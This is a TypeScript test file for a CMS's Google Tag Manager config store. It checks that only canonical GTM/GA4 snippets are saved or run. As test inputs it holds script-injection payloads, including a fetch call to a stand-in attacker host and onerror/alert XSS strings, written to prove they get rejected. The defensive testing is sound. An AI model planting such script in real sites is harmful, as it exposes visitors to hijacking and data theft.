import assert from 'node:assert/strict';
import { mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import test from 'node:test';
import {
  getSafeRuntimeGtmConfig,
  GtmConfigValidationError,
  readGlobalGtmConfig,
  readStoredGlobalGtmConfig,
  snippetsFromGtmId,
  writeGlobalGtmConfig,
} from '../src/gtm/store.ts';

test('structured IDs generate canonical snippets and are persisted as schema version 2', async () => {
  const root = await mkdtemp(join(tmpdir(), 'site-cms-gtm-'));
  try {
    const config = await writeGlobalGtmConfig(root, {
      gtmIds: ['gtm-abcdefg', 'GTM-ABCDEFG'],
      ga4Ids: 'g-abcdefghij',
      updatedBy: ' security-admin\u0000 ',
    });
    assert.equal(config.schemaVersion, 2);
    assert.deepEqual(config.gtmIds, ['GTM-ABCDEFG']);
    assert.deepEqual(config.ga4Ids, ['G-ABCDEFGHIJ']);
    assert.match(config.headScript, /googletagmanager\.com\/gtm\.js/);
    assert.match(config.headScript, /googletagmanager\.com\/gtag\/js/);
    assert.equal(config.footerScript, '');
    assert.equal(config.updatedBy, 'security-admin');

    const persisted = JSON.parse(await readFile(join(root, 'gtm.json'), 'utf8'));
    assert.deepEqual(persisted.gtmIds, ['GTM-ABCDEFG']);
    assert.equal(persisted.schemaVersion, 2);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test('raw script-bearing fields and invalid structured IDs are rejected before persistence', async () => {
  const root = await mkdtemp(join(tmpdir(), 'site-cms-gtm-'));
  try {
    await assert.rejects(
      writeGlobalGtmConfig(root, {
        gtmIds: 'GTM-ABCDEFG',
        headScript: '<script>fetch("https://attacker.example")</script>',
        updatedBy: 'test',
      }),
      GtmConfigValidationError,
    );
    await assert.rejects(
      writeGlobalGtmConfig(root, { gtmIds: 'GTM-ABC!', updatedBy: 'test' }),
      GtmConfigValidationError,
    );
    await assert.rejects(readFile(join(root, 'gtm.json'), 'utf8'), { code: 'ENOENT' });
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test('runtime regenerates structured markup and ignores tampered persisted HTML', () => {
  const safe = getSafeRuntimeGtmConfig({
    schemaVersion: 2,
    gtmIds: ['GTM-ABCDEFG'],
    ga4Ids: [],
    headScript: '<script>fetch("https://attacker.example")</script>',
    bodyHtml: '<img src=x onerror=alert(1)>',
    footerScript: '<script>alert(1)</script>',
    updatedAt: '2026-08-09T00:00:00.000Z',
    updatedBy: 'test',
  });
  assert.ok(safe);
  assert.equal(safe.headScript, snippetsFromGtmId('GTM-ABCDEFG').headScript);
  assert.doesNotMatch(safe.headScript, /attacker|alert|fetch/);
  assert.doesNotMatch(safe.bodyHtml, /onerror/);
  assert.equal(safe.footerScript, '');
});

test('canonical legacy snippets execute, but arbitrary legacy markup is raw-readable only', async () => {
  const root = await mkdtemp(join(tmpdir(), 'site-cms-gtm-'));
  try {
    const snippets = snippetsFromGtmId('GTM-ABCDEFG');
    const legacy = {
      ...snippets,
      updatedAt: '2026-08-09T00:00:00.000Z',
      updatedBy: 'legacy-admin',
    };
    assert.ok(getSafeRuntimeGtmConfig(legacy));

    const unsafe = {
      ...legacy,
      footerScript: '<script>fetch("https://attacker.example")</script>',
    };
    await writeFile(join(root, 'gtm.json'), `${JSON.stringify(unsafe)}\n`, 'utf8');
    assert.deepEqual(await readStoredGlobalGtmConfig(root), unsafe);
    assert.equal(await readGlobalGtmConfig(root), null);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});
